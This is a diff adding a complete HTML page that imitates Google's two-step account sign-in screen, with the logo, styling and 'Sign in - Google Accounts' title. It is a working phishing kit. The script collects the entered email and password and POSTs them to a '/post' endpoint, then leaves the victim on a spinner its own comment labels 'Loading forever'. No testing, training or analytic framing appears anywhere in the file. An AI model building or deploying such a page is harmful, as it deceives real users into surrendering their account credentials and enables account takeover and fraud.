@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title>Sign in - Google Accounts</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{font-family:Arial,sans-serif;background:#f0f4f9;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}
+.c{background:#fff;border-radius:24px;box-shadow:0 2px 8px rgba(0,0,0,.1);width:400px;max-width:100%;padding:40px 36px 32px;position:relative}
+.step{display:none;flex-direction:column}
+.step.on{display:flex}
+svg.g{width:36px;height:36px;margin-bottom:22px;display:block}
+h1{font-size:22px;font-weight:500;color:#1f1f1f;margin-bottom:4px}
+.sub{font-size:15px;color:#444746;margin-bottom:22px}
+.fw{position:relative;margin-bottom:4px}
+.fw input{width:100%;height:52px;border:1.5px solid #c4c7c5;border-radius:6px;padding:16px 14px 0;font-size:16px;color:#1f1f1f;background:#fff;outline:none;font-family:inherit;-webkit-appearance:none}
+.fw input:focus{border:2px solid #1a73e8}
+.fw input.e{border:2px solid #b3261e}
+.fw label{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:15px;color:#747775;pointer-events:none;background:#fff;padding:0 3px;transition:all .15s}
+.fw input:focus~label,.fw input:not(:placeholder-shown)~label{top:0;font-size:11px;color:#1a73e8}
+.fw input.e~label{color:#b3261e}
+.fw input:not(:focus):not(:placeholder-shown)~label{color:#747775}
+.em{font-size:12px;color:#b3261e;min-height:16px;display:none;align-items:center;gap:4px;padding:2px}
+.em.on{display:flex}
+.em svg{width:13px;height:13px;fill:#b3261e;flex-shrink:0}
+.lk{font-size:13px;font-weight:500;color:#1a73e8;background:none;border:none;cursor:pointer;font-family:inherit;padding:4px;margin-top:6px;text-align:left;border-radius:4px;min-height:44px;display:inline-flex;align-items:center}
+.lk:active{background:rgba(26,115,232,.08)}
+.sp{flex:1;min-height:20px}
+.rw{display:flex;align-items:center;justify-content:space-between;margin-top:24px}
+.gh{font-size:14px;font-weight:500;color:#1a73e8;background:none;border:none;cursor:pointer;font-family:inherit;border-radius:18px;padding:9px 12px;display:inline-flex;align-items:center;gap:3px;min-height:44px}
+.gh:active{background:rgba(26,115,232,.08)}
+.pr{font-size:14px;font-weight:500;color:#fff;background:#1a73e8;border:none;cursor:pointer;font-family:inherit;border-radius:18px;padding:0 24px;height:44px;min-width:84px;-webkit-appearance:none}
+.pr:active{background:#1558b0}
+.aw{display:flex;flex-direction:column;gap:10px;margin-bottom:18px}
+.av{width:68px;height:68px;border-radius:50%;background:#1a73e8;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:500;color:#fff}
+.pl{display:inline-flex;align-items:center;gap:4px;background:#f1f3f4;border:1px solid #dadce0;border-radius:18px;padding:4px 10px 4px 7px;font-size:13px;color:#1f1f1f;cursor:pointer;font-family:inherit;min-height:36px}
+.pl:active{background:#e8eaed}
+.pl svg{width:12px;height:12px;stroke:#5f6368;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}
+.pe{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:190px}
+#sl{align-items:center;justify-content:center;padding:52px 0 56px;gap:28px}
+.sw{width:44px;height:44px;animation:rot 1.2s linear infinite}
+@keyframes rot{to{transform:rotate(360deg)}}
+.sc{fill:none;stroke:#4285f4;stroke-width:4;stroke-linecap:round;stroke-dasharray:1 150;stroke-dashoffset:0;animation:d 1.2s ease-in-out infinite,k 4.8s ease-in-out infinite}
+@keyframes d{0%{stroke-dasharray:1 150;stroke-dashoffset:0}50%{stroke-dasharray:90 150;stroke-dashoffset:-35}100%{stroke-dasharray:90 150;stroke-dashoffset:-125}}
+@keyframes k{0%,100%{stroke:#4285f4}25%{stroke:#ea4335}50%{stroke:#fbbc05}75%{stroke:#34a853}}
+.lt{font-size:14px;color:#5f6368;display:flex;align-items:center}
+.dt{width:3px;height:3px;border-radius:50%;background:#9aa0a6;margin-left:3px;animation:dp 1.4s ease-in-out infinite}
+.dt:nth-child(1){animation-delay:0s}
+.dt:nth-child(2){animation-delay:.16s}
+.dt:nth-child(3){animation-delay:.32s}
+@keyframes dp{0%,80%,100%{opacity:.2;transform:scale(.8)}40%{opacity:1;transform:scale(1.2)}}
+.bw{position:absolute;bottom:0;left:0;right:0;height:3px;background:#e8eaed;border-radius:0 0 24px 24px;overflow:hidden}
+.bf{position:absolute;top:0;left:-55%;width:50%;height:100%;background:linear-gradient(90deg,#4285f4,#ea4335,#fbbc05,#34a853);animation:bs 1.6s cubic-bezier(.4,0,.6,1) infinite}
+@keyframes bs{0%{left:-55%;width:50%}40%{width:60%}100%{left:110%;width:50%}}
+.ft{width:100%;max-width:400px;display:flex;justify-content:space-between;align-items:center;margin-top:14px;flex-wrap:wrap;gap:6px}
+.ft select,.ft a{font-size:11px;color:#5f6368;background:none;border:none;cursor:pointer;font-family:inherit;text-decoration:none}
+.ft a:active{color:#1a73e8}
+.fl{display:flex;gap:14px}
+@media(max-width:480px){body{padding:0;background:#fff;justify-content:flex-start}.c{width:100%;border-radius:0;box-shadow:none;min-height:100vh;padding:32px 24px 24px}.ft{padding:10px 24px}}
+</style>
+</head>
+<body>
+
+<div class="c" id="card">
+
+  <!-- STEP 1: Email -->
+  <div class="step on" id="s1">
+    <svg class="g" viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6C44.5 38.17 46.98 31.8 46.98 24.55z"/>
+      <path fill="#34A853" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.97-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#FBBC05" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+      <path fill="#4285F4" d="M24 20h22.6v8H24z"/>
+    </svg>
+    <h1>Sign in</h1>
+    <p class="sub">Use your Google Account</p>
+    <div class="fw" id="ew">
+      <input type="email" id="ei" placeholder=" " autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" inputmode="email"/>
+      <label for="ei">Email or phone</label>
+    </div>
+    <div class="em" id="ee">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+      <span id="et"></span>
+    </div>
+    <button class="lk" type="button">Forgot email?</button>
+    <div class="sp"></div>
+    <div class="rw">
+      <button class="gh" type="button">Create account</button>
+      <button class="pr" type="button" onclick="nxt()">Next</button>
+    </div>
+  </div>
+
+  <!-- STEP 2: Password -->
+  <div class="step" id="s2">
+    <svg class="g" viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6C44.5 38.17 46.98 31.8 46.98 24.55z"/>
+      <path fill="#34A853" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.97-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#FBBC05" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+      <path fill="#4285F4" d="M24 20h22.6v8H24z"/>
+    </svg>
+    <div class="aw">
+      <div class="av" id="av">U</div>
+      <button class="pl" type="button" onclick="bck()">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        <span class="pe" id="pe">user@gmail.com</span>
+        <svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg>
+      </button>
+    </div>
+    <h1>Welcome</h1>
+    <p class="sub">Enter your password</p>
+    <div class="fw" id="pw">
+      <input type="password" id="pi" placeholder=" " autocomplete="off"/>
+      <label for="pi">Enter your password</label>
+    </div>
+    <div class="em" id="pe2">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+      <span id="pt"></span>
+    </div>
+    <button class="lk" type="button">Forgot password?</button>
+    <div class="sp"></div>
+    <div class="rw">
+      <button class="gh" type="button" onclick="bck()">&#8592; Back</button>
+      <button class="pr" type="button" onclick="sub()">Next</button>
+    </div>
+  </div>
+
+  <!-- STEP 3: Loading forever -->
+  <div class="step" id="sl">
+    <svg class="sw" viewBox="0 0 48 48">
+      <circle class="sc" cx="24" cy="24" r="20"/>
+    </svg>
+    <div class="lt">
+      Signing in
+      <span class="dt"></span>
+      <span class="dt"></span>
+      <span class="dt"></span>
+    </div>
+    <div class="bw"><div class="bf"></div></div>
+  </div>
+
+</div>
+
+<footer class="ft">
+  <select><option>English (United States)</option><option>Español</option><option>Français</option><option>Deutsch</option></select>
+  <div class="fl">
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+</footer>
+
+<script>
+var em='';
+function $(i){return document.getElementById(i)}
+function sh(id){
+  var a=['s1','s2','sl'],i;
+  for(i=0;i<a.length;i++){$(a[i]).style.display='none';$(a[i]).className='step'}
+  $(id).style.display='flex';
+  $(id).className='step on';
+  window.scrollTo(0,0);
+}
+function se(inp,eid,tid,m){inp.classList.add('e');$(eid).className='em on';$(tid).textContent=m;inp.focus()}
+function ce(inp,eid){inp.classList.remove('e');$(eid).className='em'}
+function nxt(){
+  var i=$('ei'),v=i.value.trim();
+  if(!v){se(i,'ee','et','Enter an email or phone number.');return}
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)&&!/^[\d\s\-\+\(\)]{7,15}$/.test(v)){se(i,'ee','et','Enter a valid email or phone number.');return}
+  ce(i,'ee');
+  em=v;
+  var l=v[0].toUpperCase(),a=$('av');
+  var c=['#1a73e8','#ea4335','#34a853','#fbbc05','#e37400','#8430ce','#007b83','#c2185b'];
+  a.textContent=l;a.style.background=c[l.charCodeAt(0)%c.length];
+  $('pe').textContent=v;
+  sh('s2');
+  setTimeout(function(){$('pi').focus()},150);
+}
+function bck(){
+  var p=$('pi');p.value='';ce(p,'pe2');
+  sh('s1');
+  setTimeout(function(){$('ei').focus()},150);
+}
+function sub(){
+  var i=$('pi'),v=i.value;
+  if(!v){se(i,'pe2','pt','Enter a password.');return}
+  ce(i,'pe2');
+  i.blur();
+  sh('sl');
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/post',true);
+    x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    x.send('email='+encodeURIComponent(em)+'&password='+encodeURIComponent(v));
+  }catch(e){}
+}
+$('ei').addEventListener('keydown',function(e){if(e.key==='Enter')nxt()});
+$('pi').addEventListener('keydown',function(e){if(e.key==='Enter')sub()});
+</script>
+</body>
+</html>
